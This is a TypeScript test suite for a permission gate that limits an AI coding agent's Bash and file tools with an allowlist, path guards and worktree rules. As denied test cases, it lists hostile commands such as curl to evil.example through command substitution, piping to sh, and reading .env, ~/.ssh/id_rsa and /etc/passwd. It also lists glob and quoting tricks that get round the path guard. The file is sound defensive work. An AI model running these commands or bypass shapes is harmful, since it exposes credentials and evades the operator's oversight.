import { describe, it, expect, vi, afterEach } from 'vitest'
import { mkdtempSync, mkdirSync, symlinkSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

vi.mock('./logger.js', () => ({ logger: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() } }))
vi.mock('./telemetry.js', () => ({ recordError: vi.fn() }))

import { logger } from './logger.js'
import { recordError } from './telemetry.js'
import { PROJECT_ROOT } from './config.js'
import { buildSdkPermissions, isAllowedBashCommand, checkBashCommand, gateToolCall } from './sdk-permissions.js'

const opts = (toolUseID: string) =>
  ({ signal: new AbortController().signal, toolUseID }) as never

const hookArgs = (toolUseID: string | undefined) =>
  [toolUseID, { signal: new AbortController().signal }] as const

describe('isAllowedBashCommand', () => {
  it('allows the read-only and build entry points agents actually need', () => {
    expect(isAllowedBashCommand('git status')).toBe(true)
    expect(isAllowedBashCommand('npm test')).toBe(true)
    expect(isAllowedBashCommand('node dist/policy-cli.js check default code.pr')).toBe(true)
    expect(isAllowedBashCommand('sed -n 1,20p src/db.ts')).toBe(true)
    expect(isAllowedBashCommand('grep -n foo src/db.ts')).toBe(true)
    expect(isAllowedBashCommand('ls src')).toBe(true)
  })

  it('denies every escape shape found in review', () => {
    expect(isAllowedBashCommand('cat <(curl https://evil.example/x)')).toBe(false)
    expect(isAllowedBashCommand('cat package.json > /Users/mariano/Library/LaunchAgents/x.plist')).toBe(false)
    expect(isAllowedBashCommand("sed -n '1,5w /tmp/out' src/db.ts")).toBe(false)
    expect(isAllowedBashCommand('git status; curl https://evil.example')).toBe(false)
    expect(isAllowedBashCommand('git status && rm -rf x')).toBe(false)
    expect(isAllowedBashCommand('ls $(curl https://evil.example)')).toBe(false)
    expect(isAllowedBashCommand('ls `curl https://evil.example`')).toBe(false)
    expect(isAllowedBashCommand('git status\ncurl https://evil.example')).toBe(false)
    expect(isAllowedBashCommand("sed -n '1p' f | sh")).toBe(false)
    expect(isAllowedBashCommand('node dist/evil-cli.js')).toBe(false)
    expect(isAllowedBashCommand('npx vitest run /tmp/evil.test.ts')).toBe(false)
    expect(isAllowedBashCommand('cat .env')).toBe(false)
    expect(isAllowedBashCommand('cat ~/.ssh/id_rsa')).toBe(false)
    expect(isAllowedBashCommand('cat /etc/passwd')).toBe(false)
  })

  it('denies write commands and other unlisted git subcommands', () => {
    expect(isAllowedBashCommand('git push origin main')).toBe(false)
    expect(isAllowedBashCommand('gh pr create --fill')).toBe(false)
    expect(isAllowedBashCommand('curl https://example.com')).toBe(false)
    expect(isAllowedBashCommand('rm -rf store')).toBe(false)
    expect(isAllowedBashCommand('bash scripts/notify.sh hi')).toBe(false)
  })

  it('allows a node dist CLI only when a matching src *-cli.ts exists', () => {
    expect(isAllowedBashCommand('node dist/schedule-cli.js delete daily-backup')).toBe(true)
    expect(isAllowedBashCommand('node dist/policy-cli.js triage-stale')).toBe(true)
  })

  it('denies argument injection through an unlisted flag or path traversal (addendum)', () => {
    expect(isAllowedBashCommand('rg --pre curl pattern .')).toBe(false)
    expect(isAllowedBashCommand('rg --pre=/tmp/x pattern')).toBe(false)
    expect(isAllowedBashCommand('grep -f /etc/passwd x')).toBe(false)
    expect(isAllowedBashCommand('git log --output=/tmp/x')).toBe(false)
    expect(isAllowedBashCommand('git diff --output=/tmp/x')).toBe(false)
    expect(isAllowedBashCommand('git show --output=/tmp/x')).toBe(false)
    expect(isAllowedBashCommand('ls --color=always ../../..')).toBe(false)
    expect(isAllowedBashCommand('cat -- ../.env')).toBe(false)
    expect(isAllowedBashCommand('cat ../.env')).toBe(false)
    expect(isAllowedBashCommand('grep -n foo ../secrets')).toBe(false)
  })

  it('allows the addendum examples of properly flagged commands', () => {
    expect(isAllowedBashCommand('rg -n foo src')).toBe(true)
    expect(isAllowedBashCommand('git log -n 5 --oneline')).toBe(true)
    expect(isAllowedBashCommand('git diff --stat')).toBe(true)
  })

  it('denies glob expansion and quote splitting that bypass the path guard (fix round 2)', () => {
    expect(isAllowedBashCommand('cat .e*')).toBe(false)
    expect(isAllowedBashCommand('cat ".e"nv')).toBe(false)
    expect(isAllowedBashCommand('cat sto*/claudepaw*')).toBe(false)
  })

  it('denies grep -r and git rev:path reads that bypass the path guard (fix round 2)', () => {
    expect(isAllowedBashCommand('grep -r AKIA .')).toBe(false)
    expect(isAllowedBashCommand('git show HEAD:.env')).toBe(false)
    expect(isAllowedBashCommand('git log -p -- .env')).toBe(false)
    expect(isAllowedBashCommand('git diff HEAD~1 -- .env')).toBe(false)
  })

  it('allows the fix round 2 replacements for the denied shapes above', () => {
    expect(isAllowedBashCommand('git show --stat HEAD')).toBe(true)
    expect(isAllowedBashCommand('rg -n AKIA src')).toBe(true)
  })

  it('denies a bare cat and allows both git log count forms (fix round 4)', () => {
    expect(isAllowedBashCommand('cat')).toBe(false)
    expect(isAllowedBashCommand('cat ')).toBe(false)
    expect(isAllowedBashCommand('cat src/db.ts')).toBe(true)
    expect(isAllowedBashCommand('git log -3 --oneline')).toBe(true)
    expect(isAllowedBashCommand('git log -n 3 --oneline')).toBe(true)
    expect(isAllowedBashCommand('git log -3')).toBe(true)
    expect(isAllowedBashCommand('git log --oneline -5')).toBe(true)
  })

  it('runs the path guard on the wrapper arm (final fix A2)', () => {
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body-file .env')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body-file=.env')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body-file store/claudepaw.db')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body-file=../../x')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default issue comment -F .env')).toBe(false)
    expect(isAllowedBashCommand('bash scripts/gh-wrapper.sh default pr create --body-file .env')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --title x --body y')).toBe(true)
    expect(isAllowedBashCommand('scripts/git-push-wrapper.sh default origin main')).toBe(true)
  })

  // A PR title or an issue body is prose. Running the path rules over it denied
  // ordinary GitHub work; the file-taking flags are what actually matter.
  it('lets prose through --body and --title while still guarding the file flags', () => {
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default issue comment 12 --body Updated the docs in /docs/readme')).toBe(true)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --title Fix ../../ traversal --body see /etc/passwd')).toBe(true)
    // The equals form is one token, so only that token is prose. Words after it
    // are separate arguments and are still checked.
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body=mentions-the-.env-file')).toBe(true)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body=ok .env')).toBe(false)
    // gh has more file-taking flags than the list above, so an unknown flag in
    // the equals form still has its value path-checked.
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --unknown=.env')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --unknown=store/claudepaw.db')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --unknown=x')).toBe(true)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body x --body-file .env')).toBe(false)
    expect(isAllowedBashCommand('scripts/gh-wrapper.sh default pr create --body x --body-file=store/claudepaw.db')).toBe(false)
  })

  it('allows git revision syntax while still denying home expansion (round 4 addendum 2)', () => {
    expect(isAllowedBashCommand('git show --stat HEAD~1')).toBe(true)
    expect(isAllowedBashCommand('git diff --stat HEAD^')).toBe(true)
    expect(isAllowedBashCommand('cat ~/.ssh/id_rsa')).toBe(false)
    expect(isAllowedBashCommand('cat ~')).toBe(false)
    expect(isAllowedBashCommand('git show HEAD~1:.env')).toBe(false)
  })
})

describe('checkBashCommand reasons', () => {
  it('gives a specific reason for a shell metacharacter', () => {
    expect(checkBashCommand('git status && curl x').reason).toBe('shell metacharacter')
  })

  it('gives a specific reason for a forbidden path', () => {
    expect(checkBashCommand('cat .env').reason).toBe('path not allowed')
  })

  it('gives a generic reason for a command that is simply not listed', () => {
    expect(checkBashCommand('curl https://example.com').reason).toBe('not on the allowlist')
  })
})

describe('gateToolCall', () => {
  it('allows an allow-listed Bash command', () => {
    expect(gateToolCall('Bash', { command: 'npm test' }, null).allowed).toBe(true)
  })

  it('denies a Bash command that is not on the allowlist, with a reason', () => {
    const res = gateToolCall('Bash', { command: 'curl https://evil.example' }, null)
    expect(res.allowed).toBe(false)
    expect(res.message).toContain('not on the allowlist')
  })

  it('allows a non-Bash tool when the soul has no tools restriction', () => {
    expect(gateToolCall('Read', { file_path: 'src/db.ts' }, null).allowed).toBe(true)
  })

  it('denies a tool outside the soul tool set', () => {
    expect(gateToolCall('Write', { file_path: 'src/db.ts' }, ['Read']).allowed).toBe(false)
  })

  it('denies Read of .env (fix round 3), and allows Read of src/db.ts', () => {
    expect(gateToolCall('Read', { file_path: '.env' }, null).allowed).toBe(false)
    expect(gateToolCall('Read', { file_path: 'src/db.ts' }, null).allowed).toBe(true)
  })

  it('denies Grep with a forbidden path argument (fix round 3)', () => {
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'store/' }, null).allowed).toBe(false)
  })

  it('denies Glob with a forbidden pattern (fix round 3)', () => {
    expect(gateToolCall('Glob', { pattern: '**/.env*' }, null).allowed).toBe(false)
  })

  it('denies Read outside PROJECT_ROOT (fix round 3)', () => {
    expect(gateToolCall('Read', { file_path: '/etc/passwd' }, null).allowed).toBe(false)
  })

  it('still gates Bash by the allowlist even when the soul restricts to Bash', () => {
    expect(gateToolCall('Bash', { command: 'curl https://evil.example' }, ['Bash']).allowed).toBe(false)
  })
})

describe('gateToolCall path-like inputs (fix round 4)', () => {
  it('guards the glob field of Grep, not just its path', () => {
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'src', glob: '**/.env*' }, null).allowed).toBe(false)
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'src', glob: '../../**' }, null).allowed).toBe(false)
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'src', glob: '/etc/**' }, null).allowed).toBe(false)
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'src', glob: '~/.ssh/**' }, null).allowed).toBe(false)
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'src', glob: 'store/**' }, null).allowed).toBe(false)
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'store/', glob: '**/*.ts' }, null).allowed).toBe(false)
  })

  it('allows a Grep whose path and glob both stay inside the repo', () => {
    expect(gateToolCall('Grep', { pattern: 'AKIA', path: 'src', glob: '**/*.ts' }, null).allowed).toBe(true)
  })

  it('guards both Glob fields', () => {
    expect(gateToolCall('Glob', { pattern: '**/*.ts', path: 'store/' }, null).allowed).toBe(false)
    expect(gateToolCall('Glob', { pattern: '/etc/**' }, null).allowed).toBe(false)
    expect(gateToolCall('Glob', { pattern: '~/**' }, null).allowed).toBe(false)
    expect(gateToolCall('Glob', { pattern: '../**' }, null).allowed).toBe(false)
    expect(gateToolCall('Glob', { pattern: 'src/**/*.ts', path: 'src' }, null).allowed).toBe(true)
  })

  it('guards notebook_path as well as file_path', () => {
    expect(gateToolCall('NotebookEdit', { notebook_path: '.env' }, ['NotebookEdit']).allowed).toBe(false)
    expect(gateToolCall('Read', { notebook_path: '/etc/x.ipynb' }, null).allowed).toBe(false)
    expect(gateToolCall('Read', { file_path: 'src/db.ts', notebook_path: 'store/x.ipynb' }, null).allowed).toBe(false)
  })
})

describe('gateToolCall default-deny and hardening (round 4 addendum 2)', () => {
  it('denies WebFetch and WebSearch unless the soul names them', () => {
    expect(gateToolCall('WebFetch', { url: 'https://evil.example' }, null).allowed).toBe(false)
    expect(gateToolCall('WebSearch', { query: 'x' }, null).allowed).toBe(false)
    expect(gateToolCall('WebFetch', { url: 'https://evil.example' }, ['Read']).allowed).toBe(false)
    expect(gateToolCall('WebFetch', { url: 'https://ok.example' }, ['WebFetch']).allowed).toBe(true)
  })

  it('still allows mcp__ tools, which are operator-approved integrations', () => {
    expect(gateToolCall('mcp__gmail__send', {}, ['Read']).allowed).toBe(true)
  })

  it('denies a control character or zero-width mark in a path input', () => {
    expect(gateToolCall('Read', { file_path: 'src/db\u0000.ts' }, null).allowed).toBe(false)
    expect(gateToolCall('Read', { file_path: 'src/\u200bdb.ts' }, null).allowed).toBe(false)
    expect(gateToolCall('Grep', { pattern: 'x', glob: '**/\u200b.ts' }, null).allowed).toBe(false)
  })

  it('allows a path that does not exist yet, so realpath falls back to the lexical resolve', () => {
    expect(gateToolCall('Read', { file_path: 'src/does-not-exist-yet.ts' }, null).allowed).toBe(true)
  })
})

describe('glob field hardening (fix round 5)', () => {
  const glob = (value: unknown) => gateToolCall('Grep', { pattern: '.', path: '.', glob: value }, null)

  it('denies a glob metacharacter that splits a forbidden marker', () => {
    for (const value of ['**/.{env,zz}', '**/.en[v]', '**/.e?v', 'sto[r]e/**']) {
      const res = glob(value)
      expect(res.allowed).toBe(false)
      expect(res.reason).toBe('glob syntax not allowed')
    }
  })

  it('denies a hidden path segment in a glob', () => {
    for (const value of ['**/.env*', '.claude/**']) {
      const res = glob(value)
      expect(res.allowed).toBe(false)
      expect(res.reason).toBe('hidden path in glob')
    }
  })

  it('allows the ordinary globs an agent actually needs', () => {
    expect(glob('src/**/*.ts').allowed).toBe(true)
    expect(glob('server/public/*.js').allowed).toBe(true)
    expect(glob('**/*.md').allowed).toBe(true)
    expect(gateToolCall('Glob', { pattern: 'src/**/*.ts' }, null).allowed).toBe(true)
  })

  it('applies the same rules to the Glob pattern field', () => {
    expect(gateToolCall('Glob', { pattern: 'sto[r]e/**' }, null).reason).toBe('glob syntax not allowed')
    expect(gateToolCall('Glob', { pattern: '**/.en[v]' }, null).reason).toBe('glob syntax not allowed')
    expect(gateToolCall('Glob', { pattern: '**/.env*' }, null).reason).toBe('hidden path in glob')
  })
})

describe('glob grammar and resolved path guard (fix round 6)', () => {
  const glob = (value: string) => gateToolCall('Grep', { pattern: '.', path: '.', glob: value }, null)
  const path = (value: string) => gateToolCall('Grep', { pattern: '.', path: value }, null)

  it('denies a star used to spell around a forbidden name', () => {
    for (const value of ['**/*env', '**/*db', '**/*pem', '**/*key', '**/claudepaw*']) {
      const res = glob(value)
      expect(res.allowed).toBe(false)
      expect(res.reason).toBe('glob syntax not allowed')
    }
  })

  it('denies a star inside or after a directory name', () => {
    for (const value of ['st*re/**', 'store*/**', '*tore/**']) {
      const res = glob(value)
      expect(res.allowed).toBe(false)
      expect(res.reason).toBe('glob syntax not allowed')
    }
  })

  it('denies a hidden segment', () => {
    expect(glob('**/.env*').reason).toBe('hidden path in glob')
  })

  it('denies a literal segment that resolves to a forbidden directory', () => {
    expect(glob('store/**').reason).toBe('path not allowed')
  })

  // The forbidden checks used to run on the prefix before the first wildcard
  // only, so anything after a ** was never looked at.
  it('denies a forbidden segment anywhere in the glob, not only in the prefix', () => {
    for (const value of ['**/store/*.json', '**/claudepaw.db', '**/private.key', '**/credentials.json', '**/credentials.ts']) {
      const res = glob(value)
      expect(res.allowed).toBe(false)
      expect(res.reason).toBe('path not allowed')
    }
  })

  it('allows the grammar an agent actually needs', () => {
    for (const value of ['src/**/*.ts', 'server/public/*.js', '**/*.md', 'docs/*.md', 'src/db.ts', 'src/**/util.ts']) {
      expect(glob(value).allowed).toBe(true)
    }
    expect(gateToolCall('Glob', { pattern: 'docs/*.md' }, null).allowed).toBe(true)
  })

  it('resolves a path field instead of substring-matching it', () => {
    expect(path('store').reason).toBe('path not allowed')
    expect(path('store/').reason).toBe('path not allowed')
    expect(path('./store/../src').allowed).toBe(true)
    expect(path('src').allowed).toBe(true)
  })

  it('denies a forbidden basename and a forbidden directory under any spelling', () => {
    expect(gateToolCall('Read', { file_path: './src/../.env' }, null).allowed).toBe(false)
    expect(gateToolCall('Read', { file_path: 'store/claudepaw.db' }, null).allowed).toBe(false)
    expect(gateToolCall('Read', { file_path: 'src/x.pem' }, null).allowed).toBe(false)
    expect(gateToolCall('Read', { file_path: 'src/my-credentials.ts' }, null).allowed).toBe(false)
    expect(gateToolCall('Read', { file_path: '.git/config' }, null).allowed).toBe(false)
  })
})

describe('non-string tool inputs fail closed (fix round 5)', () => {
  it('denies an array or object in a guarded field', () => {
    expect(gateToolCall('Grep', { pattern: '.', glob: ['**/.env*'] }, null).reason).toBe('invalid input type')
    expect(gateToolCall('Read', { file_path: ['.env'] }, null).reason).toBe('invalid input type')
    expect(gateToolCall('Read', { file_path: { toString: () => 'src/db.ts' } }, null).reason).toBe('invalid input type')
    expect(gateToolCall('Read', { file_path: 42 }, null).reason).toBe('invalid input type')
  })

  it('denies a file tool that omits its required path', () => {
    expect(gateToolCall('Read', {}, null).reason).toBe('invalid input type')
    expect(gateToolCall('Write', { content: 'x' }, ['Write']).reason).toBe('invalid input type')
    expect(gateToolCall('NotebookEdit', { file_path: 'src/x.ipynb' }, ['NotebookEdit']).reason).toBe('invalid input type')
  })

  it('leaves an optional guarded field absent alone', () => {
    expect(gateToolCall('Grep', { pattern: '.' }, null).allowed).toBe(true)
    expect(gateToolCall('Read', { file_path: 'src/db.ts' }, null).allowed).toBe(true)
  })
})

describe('write-class target guard (fix round 4)', () => {
  for (const tool of ['Write', 'Edit', 'MultiEdit', 'NotebookEdit']) {
    const field = tool === 'NotebookEdit' ? 'notebook_path' : 'file_path'
    it(`denies ${tool} on an executable or internal path even when the soul enables it`, () => {
      const wanted = [tool]
      for (const target of [
        'dist/policy-cli.js',
        'scripts/gh-wrapper.sh',
        'node_modules/left-pad/index.js',
        '.git/config',
        '.worktrees/x/src/a.ts',
        'src/policy-cli.ts',
        '.env',
        `${PROJECT_ROOT}/dist/policy-cli.js`,
      ]) {
        expect(gateToolCall(tool, { [field]: target }, wanted).allowed).toBe(false)
      }
      expect(gateToolCall(tool, { [field]: 'src/db.ts' }, wanted).allowed).toBe(true)
    })
  }

  it('still allows Read of a path the write tools may not target', () => {
    expect(gateToolCall('Read', { file_path: 'dist/policy-cli.js' }, null).allowed).toBe(true)
  })
})

describe('buildSdkPermissions', () => {
  it('keeps the full SDK preset but denies the write tools by default (fix round 2)', () => {
    const p = buildSdkPermissions(null)
    expect(p.tools).toEqual({ type: 'preset', preset: 'claude_code' })
    expect(p.disallowedTools).toEqual(expect.arrayContaining(['Write', 'Edit', 'MultiEdit', 'NotebookEdit']))
  })

  it('computes disallowedTools as the complement of a soul tools list, preset unchanged', () => {
    const p = buildSdkPermissions({ tools: ['Read', 'Grep'] })
    expect(p.tools).toEqual({ type: 'preset', preset: 'claude_code' })
    expect(p.disallowedTools).toEqual(expect.arrayContaining(['Bash', 'Write', 'Edit', 'MultiEdit', 'NotebookEdit']))
    expect(p.disallowedTools).not.toContain('Read')
    expect(p.disallowedTools).not.toContain('Grep')
  })

  it('does not deny Write when a soul explicitly asks for it', () => {
    const p = buildSdkPermissions({ tools: ['Read', 'Write'] })
    expect(p.disallowedTools).not.toContain('Write')
    expect(p.disallowedTools).toEqual(expect.arrayContaining(['Edit', 'MultiEdit', 'NotebookEdit']))
  })

  it('canUseTool agrees with gateToolCall (allow and deny)', async () => {
    const p = buildSdkPermissions(null)
    const allowed = await p.canUseTool('Read', { file_path: 'src/db.ts' }, opts('t-agree-allow'))
    expect(allowed.behavior).toBe('allow')
    const denied = await p.canUseTool('Read', { file_path: '.env' }, opts('t-agree-deny'))
    expect(denied.behavior).toBe('deny')
  })

  it('exposes a PreToolUse hook matcher list', () => {
    const p = buildSdkPermissions(null)
    expect(p.hooks.PreToolUse).toHaveLength(1)
    expect(p.hooks.PreToolUse[0]!.hooks).toHaveLength(1)
  })

  it('PreToolUse hook denies Read of .env and passes an allowed Read through (fix round 3)', async () => {
    const p = buildSdkPermissions(null)
    const hook = p.hooks.PreToolUse[0]!.hooks[0]!

    const denied = await hook(
      { hook_event_name: 'PreToolUse', tool_name: 'Read', tool_input: { file_path: '.env' } } as never,
      ...hookArgs('toolu_hook_deny'),
    )
    expect((denied as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision).toBe('deny')

    const allowed = await hook(
      { hook_event_name: 'PreToolUse', tool_name: 'Read', tool_input: { file_path: 'src/db.ts' } } as never,
      ...hookArgs('toolu_hook_allow'),
    )
    // No explicit allow: an explicit hook allow would bypass canUseTool and
    // make the second line of defense dead code.
    expect((allowed as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision).toBeUndefined()
  })

  it('logs a denial once when the hook and canUseTool see the same tool_use_id (round 4 addendum)', async () => {
    vi.mocked(logger.warn).mockClear()
    vi.mocked(recordError).mockClear()

    const p = buildSdkPermissions(null)
    const hook = p.hooks.PreToolUse[0]!.hooks[0]!
    const input = { command: 'curl https://evil.example' }

    await hook(
      { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: input } as never,
      ...hookArgs('toolu_same'),
    )
    await p.canUseTool('Bash', input, opts('toolu_same'))

    expect(logger.warn).toHaveBeenCalledTimes(1)
    expect(recordError).toHaveBeenCalledTimes(1)
  })

  it('logs twice for two distinct tool_use_ids running the same command (round 4 addendum)', async () => {
    vi.mocked(logger.warn).mockClear()
    vi.mocked(recordError).mockClear()

    const p = buildSdkPermissions(null)
    const input = { command: 'curl https://retry.example' }

    await p.canUseTool('Bash', input, opts('toolu_first'))
    await p.canUseTool('Bash', input, opts('toolu_second'))

    expect(logger.warn).toHaveBeenCalledTimes(2)
    expect(recordError).toHaveBeenCalledTimes(2)
  })

  it('attributes the denial to the project (round 4 addendum)', async () => {
    vi.mocked(recordError).mockClear()

    const p = buildSdkPermissions(null, 'example-company')
    await p.canUseTool('Bash', { command: 'curl https://attrib.example' }, opts('toolu_attrib'))

    expect(recordError).toHaveBeenCalledWith(
      'agent-permissions',
      'warn',
      expect.any(String),
      undefined,
      expect.objectContaining({ projectId: 'example-company' }),
    )
  })

  it('denies with a gate error reason when the gate itself throws (round 4 addendum 2)', async () => {
    vi.mocked(recordError).mockClear()

    const p = buildSdkPermissions(null)
    const hook = p.hooks.PreToolUse[0]!.hooks[0]!
    // A Bash input whose command getter throws reaches gateToolCall and blows up.
    const exploding = { get command(): string { throw new Error('boom') } }

    const res = await hook(
      { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: exploding } as never,
      ...hookArgs('toolu_throw'),
    )
    expect((res as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision).toBe('deny')
    expect(recordError).toHaveBeenCalledWith(
      'agent-permissions',
      'warn',
      expect.stringContaining('gate error'),
      undefined,
      expect.objectContaining({ reason: 'gate error' }),
    )
  })

  it('denies WebFetch and WebSearch by default and enables them per soul (round 4 addendum 2)', () => {
    const p = buildSdkPermissions(null)
    expect(p.disallowedTools).toEqual(expect.arrayContaining(['WebFetch', 'WebSearch']))

    const fetcher = buildSdkPermissions({ tools: ['Read', 'WebFetch'] })
    expect(fetcher.disallowedTools).not.toContain('WebFetch')
    expect(fetcher.disallowedTools).toContain('WebSearch')
  })
})

describe('gateToolCall workRoot (Task 7 fix round 1, Critical 1)', () => {
  const workRoot = '.worktrees/pawdev-c1'

  it('allows a Write inside the worktree', () => {
    expect(gateToolCall('Write', { file_path: 'src/x.ts' }, ['Write'], workRoot).allowed).toBe(true)
  })

  it('denies a Write to a forbidden location inside the worktree', () => {
    expect(gateToolCall('Write', { file_path: '.env' }, ['Write'], workRoot).allowed).toBe(false)
    expect(gateToolCall('Write', { file_path: '.git/config' }, ['Write'], workRoot).allowed).toBe(false)
    expect(gateToolCall('Write', { file_path: 'store/a.db' }, ['Write'], workRoot).allowed).toBe(false)
    expect(gateToolCall('Write', { file_path: 'scripts/x.sh' }, ['Write'], workRoot).allowed).toBe(false)
  })

  it('denies a Write that climbs out of the worktree', () => {
    expect(gateToolCall('Write', { file_path: '../../src/x.ts' }, ['Write'], workRoot).allowed).toBe(false)
  })

  it('denies every tool call with a workRoot outside .worktrees/', () => {
    const res = gateToolCall('Read', { file_path: 'src/db.ts' }, null, 'src')
    expect(res.allowed).toBe(false)
    expect(res.reason).toBe('invalid work root')
  })

  it('denies a workRoot that climbs out of .worktrees/ with ..', () => {
    const res = gateToolCall('Read', { file_path: 'src/db.ts' }, null, '.worktrees/../src')
    expect(res.allowed).toBe(false)
    expect(res.reason).toBe('invalid work root')
  })

  it('without a workRoot, a write into .worktrees/ from the live checkout is still denied', () => {
    expect(gateToolCall('Write', { file_path: '.worktrees/pawdev-c1/src/x.ts' }, ['Write']).allowed).toBe(false)
  })
})

describe('gateToolCall workRoot (Task 7 fix round 2, MEDIUM: .worktrees itself)', () => {
  it('denies .worktrees itself as a work root', () => {
    const res = gateToolCall('Read', { file_path: 'src/db.ts' }, null, '.worktrees')
    expect(res.allowed).toBe(false)
    expect(res.reason).toBe('invalid work root')
  })

  it('denies a work root nested two levels below .worktrees', () => {
    const res = gateToolCall('Read', { file_path: 'src/db.ts' }, null, '.worktrees/a/b')
    expect(res.allowed).toBe(false)
    expect(res.reason).toBe('invalid work root')
  })

  it('allows a work root exactly one level below .worktrees', () => {
    expect(gateToolCall('Read', { file_path: 'src/db.ts' }, null, '.worktrees/pawdev-c1').allowed).toBe(true)
  })
})

describe('gateToolCall workRoot (Task 7 fix round 2, symlink walk-up)', () => {
  let worktreeDir: string
  let outsideDir: string

  afterEach(() => {
    rmSync(worktreeDir, { recursive: true, force: true })
    rmSync(outsideDir, { recursive: true, force: true })
  })

  it('denies a write through a symlink to a not-yet-existing file', () => {
    const worktreesRoot = join(PROJECT_ROOT, '.worktrees')
    mkdirSync(worktreesRoot, { recursive: true })
    worktreeDir = mkdtempSync(join(worktreesRoot, 'fix2-'))
    outsideDir = mkdtempSync(join(tmpdir(), 'claudepaw-outside-'))
    symlinkSync(outsideDir, join(worktreeDir, 'link'))

    const workRoot = worktreeDir.slice(PROJECT_ROOT.length + 1)
    // The leaf, notes.md, does not exist yet: this is exactly the Write-target
    // shape the symlinked parent could otherwise smuggle outside the worktree.
    const res = gateToolCall('Write', { file_path: 'link/notes.md' }, ['Write'], workRoot)
    expect(res.allowed).toBe(false)
  })
})

describe('checkBashCommand workRoot (Task 7 fix round 2, LOW)', () => {
  const workRoot = { lexical: join(PROJECT_ROOT, '.worktrees', 'pawdev-c1'), real: join(PROJECT_ROOT, '.worktrees', 'pawdev-c1') }

  it('denies an absolute path outside the work root', () => {
    expect(checkBashCommand(`cat ${join(PROJECT_ROOT, 'src', 'db.ts')}`, workRoot).allowed).toBe(false)
  })

  it('allows a relative path resolved against the work root', () => {
    expect(checkBashCommand('cat src/x.ts', workRoot).allowed).toBe(true)
  })

  it('is unchanged with no work root', () => {
    expect(isAllowedBashCommand('cat src/db.ts')).toBe(true)
    expect(isAllowedBashCommand('cat /etc/passwd')).toBe(false)
  })
})
